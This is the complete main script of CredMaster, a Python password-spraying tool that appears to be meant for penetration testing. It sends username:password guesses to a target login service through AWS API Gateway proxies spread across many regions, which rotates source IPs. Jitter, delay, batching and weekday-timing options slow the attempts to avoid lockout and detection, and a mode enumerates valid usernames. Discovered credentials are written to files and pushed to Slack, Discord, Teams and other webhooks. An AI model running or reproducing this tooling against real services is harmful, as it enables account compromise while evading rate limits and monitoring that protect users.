#!/usr/bin/env python3
# from zipfile import *
import threading, argparse, datetime, json, importlib, random, os, sys, termios, tty, select
from utils.fire import FireProx
from utils.credentials_pool import CredentialsPool
from utils.cache import Cache
import utils.utils as utils
import utils.notify as notify
import logging


class CredMaster(object):

	def __init__(self, args, pargs):

		self.credentials = { "accounts" : [] }
		self.regions = [
			"us-east-2", "us-east-1","us-west-1","us-west-2","eu-west-3",
			"ap-northeast-1","ap-northeast-2","ap-south-1",
			"ap-southeast-1","ap-southeast-2","ca-central-1",
			"eu-central-1","eu-west-1","eu-west-2","sa-east-1",
		]

		self.lock = threading.Lock()
		self.lock_userenum = threading.Lock()
		self.lock_success = threading.Lock()

		self.outfile = None
		self.color = None

		self.start_time = None
		self.end_time = None
		self.time_lapse = None
		self.results = []
		self.cancelled = False

		self.notify_obj = {}

		self.clean = args.clean
		self.api_destroy = args.api_destroy
		self.api_list = args.api_list
		self.api_prefix = args.api_prefix

		# Logging things with proper libraries
		self.console_logger = logging.getLogger(__name__)
		self.success_logger = logging.getLogger("success")
		self.valid_logger = logging.getLogger("valid")
		self.progress_logger = logging.getLogger("progress")

		self.console_logger.setLevel(logging.DEBUG)
		self.console_stdout_handler = logging.StreamHandler()
		self.console_stdout_handler.setLevel(logging.INFO)
		# OG format : 
		# ts = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
		# print(f"[{ts}] {entry}")
		self.console_stdout_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
		self.console_logger.addHandler(self.console_stdout_handler)

		self.success_logger.setLevel(logging.DEBUG)
		self.success_handler = logging.FileHandler("credmaster-success.txt")
		self.success_handler.setLevel(logging.INFO)
		self.success_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
		self.success_logger.addHandler(self.success_handler)

		self.valid_logger.setLevel(logging.DEBUG)
		self.valid_handler = logging.FileHandler("credmaster-validusers.txt")
		self.valid_handler.setLevel(logging.INFO)
		self.valid_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s'))
		self.valid_logger.addHandler(self.valid_handler)

		self.progress_logger.setLevel(logging.DEBUG)
		self.progress_handler = logging.StreamHandler()
		self.progress_handler.setLevel(logging.INFO)
		self.progress_handler.setFormatter(logging.Formatter('%(asctime)s - PROGRESS - %(message)s'))
		self.progress_logger.addHandler(self.progress_handler)
		self.old_term = None

		self.progress_thread = threading.Thread(target=self.keyboard_handler)

		# Arguments parsing
		self.pargs = pargs
		self.parse_all_args(args)

		self.do_input_error_handling()

		# Utility handling, else run spray
		if args.clean:
			self.console_logger.warning("Are you sure that you want to remove **ALL** API Gateways associated with your AWS account (in any region) ?")
			self.console_logger.info("Note that you can remove a single API by first using --api_list to list APIs and then --api_destroy <API_ID>")
			resp = input("Do you really want this ? [y/N] ")
			if resp.lower() == "y":
				self.console_logger.debug("Will clear all API Gateways")
				self.clear_all_apis()
			else:
				self.console_logger.info("Cancelling...")
		elif args.api_destroy != None:
			self.destroy_single_api(args.api_destroy)
		elif args.api_list:
			self.list_apis()
		else:
			self.finished = False
			self.progress_thread.start()
			self.Execute()
			self.finished = True
			self.console_logger.debug("Joining progress thread...")
			self.progress_thread.join()


	def parse_all_args(self, args):
		#
		# this function will parse both config files and CLI args
		# If a value is specified in both config and CLI, the CLI value will be preferred
		# Reason: if someone wants to take a standard config from client to client, they can override a value
		#

		self.args = args

		if args.config is not None and not os.path.exists(args.config):
			self.console_logger.info(f"Config file {args.config} cannot be found")
			sys.exit()

		# assign variables
		# TOO MANY MF VARIABLES THIS HAS GOTTEN OUT OF CONTROL
		# This is fine ;)

		config_dict = {}
		if args.config != None:
			config_dict = json.loads(open(args.config).read())

		self.plugin = args.plugin or config_dict.get("plugin")
		self.userfile = args.userfile or config_dict.get("userfile")
		self.passwordfile = args.passwordfile or config_dict.get("passwordfile")
		self.passwordconfig = args.passwordconfig or config_dict.get("passwordconfig")
		self.userpassfile = args.userpassfile or config_dict.get("userpassfile")
		self.useragentfile = args.useragentfile or config_dict.get("useragentfile")
		self.trim = args.trim or config_dict.get("trim")
		self.cache = Cache(args.cache_dir or config_dict.get("cache_dir"))
		self.debug = args.debug or config_dict.get("debug")
		if self.debug:
			self.console_stdout_handler.setLevel(logging.DEBUG)

		self.outfile = args.outfile or config_dict.get("outfile")
		if self.outfile is not None:
			self.console_file_handler = logging.FileHandler(self.outfile)
			self.console_file_handler.setLevel(logging.INFO)

		self.thread_count = args.threads or config_dict.get("threads")
		if self.thread_count == None:
			self.thread_count = 1

		self.region = args.region or config_dict.get("region")
		self.jitter = args.jitter or config_dict.get("jitter")
		self.jitter_min = args.jitter_min or config_dict.get("jitter_min")
		self.delay = args.delay or config_dict.get("delay")
		self.delay_domain = args.delay_domain or config_dict.get("delay_domain")
		
		self.batch_size = args.batch_size or config_dict.get("batch_size")
		self.batch_delay = args.batch_delay or config_dict.get("batch_delay")
		if self.batch_size != None and self.batch_delay == None:
			self.batch_delay = 1

		self.header = args.header or config_dict.get("header")
		self.weekdaywarrior = args.weekday_warrior or config_dict.get("weekday_warrior")
		self.color = args.color or config_dict.get("color")

		self.notify_obj = {
			"slack_webhook" : args.slack_webhook or config_dict.get("slack_webhook"),
			"pushover_token" : args.pushover_token or config_dict.get("pushover_token"),
			"pushover_user" : args.pushover_user or config_dict.get("pushover_user"),
			"ntfy_topic" : args.ntfy_topic or config_dict.get("ntfy_topic"),
			"ntfy_host" : args.ntfy_host or config_dict.get("ntfy_host"),
			"ntfy_token" : args.ntfy_token or config_dict.get("ntfy_token"),
			"discord_webhook" : args.discord_webhook or config_dict.get("discord_webhook"),
			"keybase_webhook" : args.keybase_webhook or config_dict.get("keybase_webhook"),
			"teams_webhook" : args.teams_webhook or config_dict.get("teams_webhook"),
			"operator_id" : args.operator_id or config_dict.get("operator_id"),
			"exclude_password" : args.exclude_password or config_dict.get("exclude_password")
		}

		self.access_key = args.access_key or config_dict.get("access_key")
		self.secret_access_key = args.secret_access_key or config_dict.get("secret_access_key")
		self.session_token = args.session_token or config_dict.get("session_token")
		self.profile_name = args.profile_name or config_dict.get("profile_name")

		self.api_prefix = args.api_prefix or config_dict.get("api_prefix")
		if self.api_prefix is None:
			self.api_prefix = "fireprox"


	def do_input_error_handling(self):

		# input exception handling
		if self.outfile != None:
			of = self.outfile + "-credmaster.txt"
			if os.path.exists(of):
				self.console_logger.error(f"File {of} already exists, try again with a unique file name")
				sys.exit()

		# File handling
		if self.userfile is not None and not os.path.exists(self.userfile):
			self.console_logger.error(f"Username file {self.userfile} cannot be found")
			sys.exit()

		if self.passwordfile is not None and not os.path.exists(self.passwordfile):
			self.console_logger.error(f"Password file {self.passwordfile} cannot be found")
			sys.exit()
		
		if self.passwordconfig is not None and not os.path.exists(self.passwordconfig):
			self.console_logger.error(f"Password config file {self.passwordconfig} cannot be found")
			sys.exit()

		if self.userpassfile is not None and not os.path.exists(self.userpassfile):
			self.console_logger.error(f"User-pass file {self.userpassfile} cannot be found")
			sys.exit()

		if self.useragentfile is not None and not os.path.exists(self.useragentfile):
			self.console_logger.error(f"Useragent file {self.useragentfile} cannot be found")
			sys.exit()

		# AWS Key Handling
		if self.session_token is not None and (self.secret_access_key is None or self.access_key is None):
			self.console_logger.error("Session token requires access_key and secret_access_key")
			sys.exit()
		if self.profile_name is not None and (self.access_key is not None or self.secret_access_key is not None):
			self.console_logger.error("Cannot use a passed profile and keys")
			sys.exit()
		if self.access_key is not None and self.secret_access_key is None:
			self.console_logger.error("access_key requires secret_access_key")
			sys.exit()
		if self.access_key is None and self.secret_access_key is not None:
			self.console_logger.error("secret_access_key requires access_key")
			sys.exit()
		if self.access_key is None and self.secret_access_key is None and self.session_token is None and self.profile_name is None:
			self.console_logger.error("No FireProx access arguments settings configured, add access keys/session token or fill out config file")
			sys.exit()

		# Region handling
		if self.region is not None and self.region not in self.regions:
			self.console_logger.error(f"Input region {self.region} not a supported AWS region, {self.regions}")
			sys.exit()

		# Jitter handling
		if self.jitter_min is not None and self.jitter is None:
			self.console_logger.error("--jitter flag must be set with --jitter-min flag")
			sys.exit()

		# Notification Error handlng
		if self.notify_obj["pushover_user"] is not None and self.notify_obj["pushover_token"] is None:
			self.console_logger.error("pushover_user input requires pushover_token input")
			sys.exit()
		elif self.notify_obj["pushover_user"] is None and self.notify_obj["pushover_token"] is not None:
			self.console_logger.error("pushover_token input requires pushover_user input")
			sys.exit()

		# Notification Error handlng - ntfy
		if self.notify_obj["ntfy_topic"] is not None and self.notify_obj["ntfy_host"] is None:
			self.console_logger.error("ntfy_topic input requires ntfy_host input")
			sys.exit()
		elif self.notify_obj["ntfy_topic"] is None and self.notify_obj["ntfy_host"] is not None:
			self.console_logger.error("ntfy_host input requires ntfy_topic input")
			sys.exit()

		# batch handling
		if self.batch_delay != None and self.batch_size == None:
			self.console_logger.error("--batch_size flag must be set with --batch_delay flag")
			sys.exit()


	def Execute(self):

		# parse plugin specific arguments
		pluginargs = {}
		if len(self.pargs) % 2 == 1:
			self.pargs.append(None)
		for i in range(0,len(self.pargs)-1):
			key = self.pargs[i].replace("--","")
			pluginargs[key] = self.pargs[i+1]

		## 
		## If any plugins require a special argument, set it here
		##    Ex: Okta plugin requires the threadcount value for some checking, set it manually
		##
		pluginargs['thread_count'] = self.thread_count

		self.start_time = datetime.datetime.utcnow()
		self.console_logger.info(f"Execution started at: {self.start_time}")

		# Check with plugin to make sure it has the data that it needs
		validator = importlib.import_module(f"plugins.{self.plugin}")
		if getattr(validator,"validate",None) is not None:
			valid, errormsg, pluginargs = validator.validate(pluginargs, self.args)
			if not valid:
				self.console_logger.error(errormsg)
				return
		else:
			self.console_logger.warning(f"No validate function found for plugin: {self.plugin}")

		self.userenum = False
		if "userenum" in pluginargs and pluginargs["userenum"]:
			self.userenum = True

		# file stuffs
		if self.userpassfile is None and (self.userfile is None or ((self.passwordfile is None and self.passwordconfig is None) and not self.userenum)):
			self.console_logger.error("Please provide plugin & username/password information, or provide API utility options (api_list/api_destroy/clean)")
			sys.exit()
		
		self.passwords = {"default": []}
		self.userpass = []


		if self.passwordconfig is not None:
			with open(self.passwordconfig, "r") as f:
				_temp = json.load(f)
			for k in _temp.keys():
				if not os.path.exists(_temp[k]):
					self.console_logger.error(f"Password file {_temp[k]} for domain {k} cannot be found")
					sys.exit()
				self.passwords[k] = self.load_file(_temp[k])

		if self.passwordfile is not None:
			self.passwords["default"].extend(self.load_file(self.passwordfile))
		
		if self.userpassfile is not None:
			self.userpass = [tuple(l.split(':')[0:2]) for l in self.load_file(self.userpassfile)]
		
		if self.userenum:
			self.passwords = {"default": ["Password123"]}

		# batch login
		if self.batch_size:
			self.console_logger.info(f"Batching requests enabled: {self.batch_size} requests, {self.batch_delay}s of delay between each batch.")


		users = []
		userpass = []
		if self.userenum:
			self.console_logger.info(f"Loading users and useragents")
			users = self.load_file(self.userfile)
		elif self.userpassfile is None:
			self.console_logger.info(f"Loading users from {self.userfile}")
			users = self.load_file(self.userfile)
		else:
			self.console_logger.info(f"Loading credentials from {self.userpassfile} as user-pass file")
			_temp = self.load_file(self.userpassfile)
			for u_p in _temp:
				userpass.append(tuple(u_p.split(':')[0:2]))
			if self.userfile is not None:
				users = self.load_file(self.userfile)
		
		useragents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"]
		if self.useragentfile is not None and os.path.exists(self.useragentfile):
			useragents = self.load_file(self.useragentfile)
		
		self.creds_pool = CredentialsPool(
							users=set(users),
							passwords=self.passwords,
							userpass=self.userpass,
							useragents=set(useragents),
							delays={
								"var": self.jitter,
			   					"req": self.jitter_min,
								"batch": self.batch_delay,
								"domain": self.delay_domain,
								"user": self.delay
							},
							batch_size=self.batch_size,
							weekday_warrior=self.weekdaywarrior,
							cache=self.cache,
							logger_entry=self.console_logger,
							logger_success=self.success_logger,
							signal_success=self.signal_success
						)

		# Custom header handling
		if self.header is not None:
			self.console_logger.info(f"Adding custom header \"{self.header}\" to requests")
			head = self.header.split(":")[0].strip()
			val = self.header.split(":")[1].strip()
			pluginargs["custom-headers"] = {head : val}

		# this is the original URL, NOT the fireproxy one. Don't use this in your sprays!
		url = pluginargs["url"]

		threads = []

		try:
			# Create lambdas based on thread count
			self.load_apis(url, region = self.region)

			# do test connection / fingerprint
			useragent = random.choice(useragents)
			connect_success, testconnect_output, pluginargs = validator.testconnect(pluginargs, self.args, self.apis[0], useragent)
			self.console_logger.info(testconnect_output)

			if not connect_success:
				self.destroy_apis()
				sys.exit()

			# Print stats
			self.display_stats()

			self.console_logger.info("Starting Spray...")

			# Start Spray
			threads = []
			for api in self.apis:
				t = threading.Thread(target = self.spray_thread, args = (api["region"], api, pluginargs) )
				threads.append(t)
				t.start()

			for t in threads:
				t.join()


			notify.notify_update(f"Info: Spray complete.", self.notify_obj)
			
			self.console_logger.info(f"Valid credentials discovered: {len(self.results)}")
			for success in self.results:
				self.console_logger.info(f"Valid: {success['username']}:{success['password']}")

			# Remove AWS resources
			self.destroy_apis()

		except KeyboardInterrupt:
			self.console_logger.warning("KeyboardInterrupt detected, cleaning up APIs")
			try:
				self.console_logger.info("Finishing active requests")
				self.cancelled = True
				self.creds_pool.cancelled = True
				self.creds_pool.get_creds_lock.release()
				for t in threads:
					t.join()
				self.destroy_apis()
				if self.old_term is not None:
					termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.old_term)
			except KeyboardInterrupt:
				self.console_logger.warning("Second KeyboardInterrupt detected, unable to clean up APIs :( try the --clean option")

				termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.old_term)

		# Capture duration
		self.end_time = datetime.datetime.utcnow()
		self.time_lapse = (self.end_time-self.start_time).total_seconds()

		# Print stats
		self.display_stats(False)


	def load_apis(self, url, region=None):

		if self.thread_count > len(self.regions):
			self.console_logger.warning("Thread count over maximum, reducing to 15")
			self.thread_count = len(self.regions)

		self.console_logger.info(f"Creating {self.thread_count} API Gateways for {url}")

		self.apis = []

		# slow but multithreading this causes errors in boto3 for some reason :(
		for x in range(0,self.thread_count):
			reg = self.regions[x]
			if region is not None:
				reg = region
			self.apis.append(self.create_api(reg, url.strip()))
			self.console_logger.info(f"Created API - Region: {reg} ID: ({self.apis[x]['api_gateway_id']}) - {self.apis[x]['proxy_url']} => {url}")


	def create_api(self, region, url):

		args, help_str = self.get_fireprox_args("create", region, url=url)
		fp = FireProx(args, help_str)
		resource_id, proxy_url = fp.create_api(url)
		return { "api_gateway_id" : resource_id, "proxy_url" : proxy_url, "region" : region }


	def get_fireprox_args(self, command, region, url = None, api_id = None):

		args = {}
		args["access_key"] = self.access_key
		args["secret_access_key"] = self.secret_access_key
		args["url"] = url
		args["command"] = command
		args["region"] = region
		args["api_id"] = api_id
		args["profile_name"] = self.profile_name
		args["session_token"] = self.session_token
		args["prefix"] = self.api_prefix

		help_str = "Error, inputs cause error."

		return args, help_str


	def display_stats(self, start=True):
		if start:
			self.console_logger.info(f"Total Regions Available: {len(self.regions)}")
			self.console_logger.info(f"Total API Gateways: {len(self.apis)}")

		if self.end_time and not start:
			self.console_logger.info(f"End Time: {self.end_time}")
			self.console_logger.info(f"Total Execution: {self.time_lapse} seconds")
			self.console_logger.info(f"Valid credentials identified: {len(self.results)}")

			for cred in self.results:
				self.console_logger.info(f"VALID - {cred['username']}:{cred['password']}")


	def display_progress(self):
		try:
			if self.creds_pool.attempts_total > 0:
				percentage = self.creds_pool.attempts_count / (self.creds_pool.attempts_total - self.creds_pool.attempts_trimmed)
			else:
				percentage = 1
			duration = datetime.datetime.utcnow() - self.start_time
			if percentage > 0:
				eta = self.start_time + (1/percentage)*duration
			else:
				eta = "+inf"
			log_string = f'{self.creds_pool.attempts_count} / {self.creds_pool.attempts_total - self.creds_pool.attempts_trimmed} '
			log_string += f'({round(100*percentage, 3)}%) ({self.creds_pool.attempts_trimmed} trimmed) - {duration} elapsed, ETA {eta} (UTC)'
			self.progress_logger.info(log_string)
		except:
			self.progress_logger.error("Error when trying to compute progress")
		return


	def list_apis(self):

		for region in self.regions:

			args, help_str = self.get_fireprox_args("list", region)
			fp = FireProx(args, help_str)
			active_apis = fp.list_api()
			self.console_logger.info(f"Region: {region} - total APIs: {len(active_apis)}")

			if len(active_apis) != 0:
				for api in active_apis:
					self.console_logger.info(f"API Info --  ID: {api['id']}, Name: {api['name']}, Created Date: {api['createdDate']}")


	def destroy_single_api(self, api):

		self.console_logger.info("Destroying single API, locating region...")
		for region in self.regions:

			args, help_str = self.get_fireprox_args("list", region)
			fp = FireProx(args, help_str)
			active_apis = fp.list_api()

			for api1 in active_apis:
				if api1["id"] == api:
					self.console_logger.info(f"API found in region {region}, destroying...")
					fp.delete_api(api)
					sys.exit()

			self.console_logger.error("API not found")


	def destroy_apis(self):

		for api in self.apis:

			args, help_str = self.get_fireprox_args("delete", api["region"], api_id = api["api_gateway_id"])
			fp = FireProx(args, help_str)
			self.console_logger.info(f"Destroying API ({args['api_id']}) in region {api['region']}")
			fp.delete_api(args["api_id"])


	def clear_all_apis(self):

		self.console_logger.info("Clearing APIs for all regions")
		clear_count = 0

		for region in self.regions:

			args, help_str = self.get_fireprox_args("list", region)
			fp = FireProx(args, help_str)
			active_apis = fp.list_api()
			count = len(active_apis)
			err = "skipping"
			if count != 0:
				err = "removing"
			self.console_logger.info(f"Region: {region}, found {count} APIs configured, {err}")

			for api in active_apis:
				if "fireprox" in api["name"]:
					fp.delete_api(api["id"])
					clear_count += 1

		self.console_logger.info(f"APIs removed: {clear_count}")


	def spray_thread(self, api_key, api_dict, pluginargs):

		try:
			plugin_authentiate = getattr(importlib.import_module(f"plugins.{self.plugin}.{self.plugin}"), f"{self.plugin}_authenticate")
		except Exception as ex:
			self.console_logger.error("Error: Failed to import plugin with exception")
			self.console_logger.error(f"Error: {ex}")
			sys.exit()
		
		while self.creds_pool.creds_left() and not self.cancelled:
			try:
				cred = self.creds_pool.get_creds()
				if cred is not None and not self.cancelled:
					self.console_logger.debug(f"[Spray Thread] Trying {cred['username']}:{cred['password']}")
					response = plugin_authentiate(api_dict["proxy_url"], cred["username"], cred["password"], cred["useragent"], pluginargs)

					# if "debug" in response.keys():
					# 	print(response["debug"])
					
					self.cache.add_tentative(cred["username"], cred["password"], Cache.TRANSLATE[response["result"].lower()], response["output"])

					if response["error"]:
						self.console_logger.error(f"ERROR: {api_key}: {cred['username']} - {response['output']}")

					if response["result"].lower() == "inexistant" and self.trim:
						self.creds_pool.trim_user(cred["username"])

					if response["result"].lower() == "success" and ("userenum" not in pluginargs):
						if self.trim:
							self.creds_pool.trim_user(cred["username"])
						self.results.append( {"username" : cred["username"], "password" : cred["password"]} )
						notify.notify_success(cred["username"], cred["password"], self.notify_obj)
						self.success_logger.info(f'{cred["username"]}:{cred["password"]}')

					if response["valid_user"] or response["result"] == "success":
						self.valid_logger.info(f'{cred["username"]}')
					if self.color:
						
						if response["result"].lower() == "success":
							self.console_logger.info(utils.prGreen(f"{api_key}: {response['output']}"))

						elif response["result"].lower() == "potential":
							self.console_logger.info(utils.prYellow(f"{api_key}: {response['output']}"))

						elif response["result"].lower() == "failure":
							self.console_logger.info(utils.prRed(f"{api_key}: {response['output']}"))
						
						elif response["result"].lower() == "failure":
							self.console_logger.info(utils.prRed(f"{api_key}: User {cred['username']} does not exist ({response['output']})"))

					else:
						self.console_logger.info(f"{api_key}: {response['output']}")

			except Exception as ex:
				self.console_logger.debug(f"Exception ! {ex}")
				self.console_logger.error(f"ERROR: {api_key}: {cred['username']} - {ex}")
		self.console_logger.debug("Spray thread exiting!")


	def load_file(self, filename):

		if filename:
			return [line.strip() for line in open(filename, 'r')]


	def signal_success(self, username, password):
		for x in self.results:
			if x["username"] == username and x["password"] == password:
				return
		self.results.append({"username": username, "password": password})


	def keyboard_handler(self):
		self.old_term = termios.tcgetattr(sys.stdin)
		tty.setcbreak(sys.stdin)
		while not self.cancelled and not self.finished:
			try:
				if select.select([sys.stdin,],[],[],1.0)[0]:
					x = sys.stdin.read(1)[0]
					if ord(x) == ord(' '):
						self.display_progress()
			except Exception as e:
				pass
		termios.tcsetattr(sys.stdin, termios.TCSADRAIN, self.old_term)


if __name__ == '__main__':

	parser = argparse.ArgumentParser()

	basic_args = parser.add_argument_group(title='Basic Inputs')
	basic_args.add_argument('--plugin', help='Spray plugin', default=None, required=False)
	basic_args.add_argument('-u', '--userfile', default=None, required=False, help='Username file')
	basic_args.add_argument('-p', '--passwordfile', default=None, required=False, help='Password file')
	basic_args.add_argument('--passwordconfig', default=None, required=False, help='Password config file (JSON wih {"domain.com":"password_file.txt"})')
	basic_args.add_argument('-f', '--userpassfile', default=None, required=False, help='Username-Password file (one-to-one map, colon separated)')
	basic_args.add_argument('-a', '--useragentfile', default=None, required=False, help='Useragent file')
	basic_args.add_argument('--config', type=str, default=None, help='Configure CredMaster using config file config.json')

	adv_args = parser.add_argument_group(title='Advanced Inputs')
	adv_args.add_argument('-o', '--outfile', default=None, required=False, help='Output file to write contents (omit extension)')
	adv_args.add_argument('-t', '--threads', type=int, default=None, help='Thread count (default 1, max 15)')
	adv_args.add_argument('--region', default=None, required=False, help='Specify AWS Region to create API Gateways in')
	adv_args.add_argument('-j', '--jitter', type=int, default=None, required=False, help='Random delay (between 0 and jitter value) added between two requests in seconds')
	adv_args.add_argument('-m', '--jitter_min', type=int, default=None, required=False, help='Minimum time between wo requests in seconds, defaults to 0')
	adv_args.add_argument('-d', '--delay', type=int, default=None, required=False, help='Delay between unique passwords on the same user, in seconds')
	adv_args.add_argument('--delay_domain', type=int, default=None, required=False, help='Delay between requests for users of the same domain, in seconds')
	adv_args.add_argument('--batch_size', type=int, default=None, required=False, help='Number of request to perform in a batch')
	adv_args.add_argument('--batch_delay', type=int, default=None, required=False, help='Delay between each batch, in seconds')
	adv_args.add_argument('--header', default=None, required=False, help='Add a custom header to each request for attribution, specify "X-Header: value"')
	adv_args.add_argument('--weekday_warrior', default=None, required=False, help="If you don't know what this is don't use it, input is timezone UTC offset")
	adv_args.add_argument('--color', default=False, action="store_true", required=False, help="Output spray results in Green/Yellow/Red colors")
	adv_args.add_argument('--trim', '--remove', action="store_true", help="Remove users with found credentials from future sprays")
	adv_args.add_argument('--cache_dir', default=".credmaster", help="Directory used for storing current state")
	adv_args.add_argument('--debug', action="store_true", help="Enable debug logging")

	notify_args = parser.add_argument_group(title='Notification Inputs')
	notify_args.add_argument('--slack_webhook', type=str, default=None, help='Webhook link for Slack notifications')
	notify_args.add_argument('--pushover_token', type=str, default=None, help='Token for Pushover notifications')
	notify_args.add_argument('--pushover_user', type=str, default=None, help='User for Pushover notifications')
	notify_args.add_argument('--ntfy_topic', type=str, default=None, help='Topic for Ntfy notifications')
	notify_args.add_argument('--ntfy_host', type=str, default=None, help='Ntfy host for notifications')
	notify_args.add_argument('--ntfy_token', type=str, default=None, help='Ntfy token for private instances')
	notify_args.add_argument('--discord_webhook', type=str, default=None, help='Webhook link for Discord notifications')
	notify_args.add_argument('--teams_webhook', type=str, default=None, help='Webhook link for Teams notifications')
	notify_args.add_argument('--keybase_webhook', type=str, default=None, help='Webhook for Keybase notifications')
	notify_args.add_argument('--operator_id', type=str, default=None, help='Optional Operator ID for notifications')
	notify_args.add_argument('--exclude_password', default=False, action="store_true", help='Exclude discovered password in Notification message')

	fp_args = parser.add_argument_group(title='Fireprox Connection Inputs')
	fp_args.add_argument('--profile_name', '--profile', type=str, default=None, help='AWS Profile Name to store/retrieve credentials')
	fp_args.add_argument('--access_key', type=str, default=None, help='AWS Access Key')
	fp_args.add_argument('--secret_access_key', type=str, default=None, help='AWS Secret Access Key')
	fp_args.add_argument('--session_token', type=str, default=None, help='AWS Session Token')

	fpu_args = parser.add_argument_group(title='Fireprox Utility Options')
	fpu_args.add_argument('--clean', default=False, action="store_true", help='Clean up all fireprox AWS APIs from every region, warning irreversible')
	fpu_args.add_argument('--api_destroy', type=str, default=None, help='Destroy single API instance, by API ID')
	fpu_args.add_argument('--api_list', default=False, action="store_true", help='List all fireprox APIs')
	fpu_args.add_argument('--api_prefix', type=str, default=None, help='Set fireprox APIs prefix')

	args,pluginargs = parser.parse_known_args()

	CredMaster(args, pluginargs)
